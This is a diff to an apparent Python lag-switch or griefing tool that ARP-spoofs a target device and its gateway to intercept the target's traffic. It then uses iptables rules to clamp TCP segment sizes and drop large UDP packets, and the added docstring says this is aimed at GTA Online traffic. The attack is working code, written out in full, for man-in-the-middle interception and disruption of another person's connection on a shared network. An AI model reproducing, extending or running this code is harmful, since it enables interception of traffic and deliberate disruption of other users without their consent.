@@ -76,13 +76,17 @@ def spoof_loop(target_ip, gateway_ip, stop_event):
 
 def mtu_limit_mitm_loop(target_ip, gateway_ip, mtu_val, stop_event):
     """
-    Enforces an MTU limit by:
+    Enforces an MTU limit over ALL protocols by:
     1. ARP-spoofing the target to route their traffic through this machine (MitM).
     2. Enabling IP forwarding so we relay packets instead of dropping them.
-    3. Using iptables to clamp the TCP MSS to (mtu_val - 40) on all forwarded SYN packets.
-    This is the same technique used by VPNs and PPPoE routers.
+    3. TCP: Clamping the TCP MSS to (mtu_val - 40) via iptables mangle.
+    4. UDP: Dropping any UDP packet larger than mtu_val via iptables length matching.
+       This covers GTA Online, which runs on UDP.
     """
-    mss_val = max(1, int(mtu_val) - 40)
+    mtu_val = int(mtu_val)
+    mss_val = max(1, mtu_val - 40)
+    udp_drop_threshold = mtu_val + 1  # drop packets strictly larger than mtu_val
+
     try:
         target_mac = get_mac(target_ip)
         gateway_mac = get_mac(gateway_ip)
@@ -93,10 +97,15 @@ def mtu_limit_mitm_loop(target_ip, gateway_ip, mtu_val, stop_event):
         # Enable IP forwarding so we relay packets as a router
         os.system("sysctl -w net.ipv4.ip_forward=1 > /dev/null 2>&1")
 
-        # Add iptables MSS clamping rules for both directions
+        # --- TCP: MSS Clamping (both directions) ---
         os.system(f"iptables -t mangle -A FORWARD -s {target_ip} -p tcp --syn -j TCPMSS --set-mss {mss_val}")
         os.system(f"iptables -t mangle -A FORWARD -d {target_ip} -p tcp --syn -j TCPMSS --set-mss {mss_val}")
-        print(f"[+] MTU Limit: Clamping MSS to {mss_val} for {target_ip} (MTU ~{mtu_val})")
+
+        # --- UDP: Drop oversized packets (both directions) ---
+        os.system(f"iptables -A FORWARD -s {target_ip} -p udp -m length --length {udp_drop_threshold}:65535 -j DROP")
+        os.system(f"iptables -A FORWARD -d {target_ip} -p udp -m length --length {udp_drop_threshold}:65535 -j DROP")
+
+        print(f"[+] MTU Limit active for {target_ip}: TCP MSS={mss_val}, UDP drop>{mtu_val}B")
 
         # ARP spoof loop — poisons target AND gateway to route traffic through us
         while not stop_event.is_set():
@@ -109,10 +118,15 @@ def mtu_limit_mitm_loop(target_ip, gateway_ip, mtu_val, stop_event):
     except Exception as e:
         print(f"[!] MTU Limit error: {e}")
     finally:
-        # Remove our iptables rules
+        # --- Remove TCP MSS clamping rules ---
         os.system(f"iptables -t mangle -D FORWARD -s {target_ip} -p tcp --syn -j TCPMSS --set-mss {mss_val}")
         os.system(f"iptables -t mangle -D FORWARD -d {target_ip} -p tcp --syn -j TCPMSS --set-mss {mss_val}")
-        print(f"[-] MTU Limit: Removed MSS clamp rules for {target_ip}")
+
+        # --- Remove UDP drop rules ---
+        os.system(f"iptables -D FORWARD -s {target_ip} -p udp -m length --length {udp_drop_threshold}:65535 -j DROP")
+        os.system(f"iptables -D FORWARD -d {target_ip} -p udp -m length --length {udp_drop_threshold}:65535 -j DROP")
+
+        print(f"[-] MTU Limit removed for {target_ip}")
 
         # Restore ARP tables on target and gateway
         try:
@@ -120,6 +134,8 @@ def mtu_limit_mitm_loop(target_ip, gateway_ip, mtu_val, stop_event):
             sendp(Ether(dst=gateway_mac)/ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip, hwsrc=target_mac), iface=state["iface"], count=3, verbose=0)
         except:
             pass
+
+
 
 def run_arp_scan(subnet):
     state["scanning"] = True
